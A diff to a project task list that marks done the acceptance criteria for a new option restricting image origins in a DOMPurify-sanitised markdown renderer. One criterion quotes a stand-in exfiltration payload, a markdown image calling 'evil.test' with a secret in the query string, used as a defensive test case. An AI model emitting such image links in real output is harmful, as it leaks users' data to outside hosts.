@@ -72,9 +72,9 @@ Standard verification for every task: `npm test`, `npm run build`, `npm run lint
 **Description:** New option (default: same-origin). The DOMPurify hook removes `<img src>` from other origins unless they're allowed; `'*'` allows all. Contract images set by `onImageBlock` are host-provided and exempt. Add it to `types.ts` and the README options table.
 
 **Acceptance criteria:**
-- [ ] `![](https://evil.test/?q=secret)` produces no request when the origin isn't allowed (test checks the `src` is removed)
-- [ ] Allowed origins and `'*'` work
-- [ ] README options table updated
+- [x] `![](https://evil.test/?q=secret)` produces no request when the origin isn't allowed (test checks the `src` is removed)
+- [x] Allowed origins and `'*'` work
+- [x] README options table updated
 
 **Verification:** tests; manual in an example with an allowed origin.
 **Dependencies:** T4
